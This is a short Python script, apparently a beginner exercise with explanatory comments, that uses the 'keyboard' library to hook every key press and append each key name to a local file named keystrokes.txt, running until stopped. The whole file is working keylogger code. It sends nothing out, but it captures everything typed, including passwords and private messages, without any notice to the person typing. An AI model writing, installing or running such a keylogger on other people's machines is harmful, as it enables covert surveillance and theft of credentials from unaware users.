import keyboard

log_file = 'keystrokes.txt'

def on_key_press(event):    # created a function that handles key press events
                            # and append it to the log file
    with open(log_file, 'a') as f:  # open file in append mode
        f.write('{}\n'.format(event.name))  # write on the file the keystroke, \n so every other
                                            # keystroke is on a new line
                                            
keyboard.on_press(on_key_press)
# call the on_key_press function anytime a key is pressed

keyboard.wait() # wait until a key is pressed before exit